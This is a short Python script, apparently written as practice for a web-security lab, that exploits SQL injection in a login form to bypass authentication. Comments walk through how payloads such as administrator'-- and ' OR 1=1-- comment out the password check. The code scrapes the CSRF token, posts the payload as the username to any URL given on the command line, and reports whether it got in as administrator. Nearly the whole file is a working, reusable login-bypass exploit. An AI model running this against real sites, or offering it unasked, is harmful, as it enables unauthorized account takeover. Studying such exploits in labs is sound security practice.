# sqli vulnerbaiility allwoing login bypass authentication
# working of the sql query 
# SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
# now if we submit the username administrator'-- we can login as administrator without providing the password because the query will becomeand these checks 
# SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
import requests 
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf_token(s,url):
    r=s.get(url,verify=False)
    soup=BeautifulSoup(r.text,'html.parser')
    csrf_token=soup.find('input',{'name':'csrf'})['value']
    return csrf_token 

def exploit_sqli(s,url,payload):
    csrf=get_csrf_token(s,url)
    data={
        "csrf":csrf,
        "username":payload,
        "password":"password ya kuchbhi"
    }
    req=s.post(url,data=data,verify=False)
    response=req.text

    if "Log out" in response:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
    
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f"[-] Example: {sys.argv[0]} http://example.com \"' OR 1=1--\"")
        sys.exit(-1)

    s=requests.Session()

    if exploit_sqli(s,url,payload):
        print("[+] SQLi successful logged in as administrator user")
    else:
        print("[-] SQLi unsuccessful")



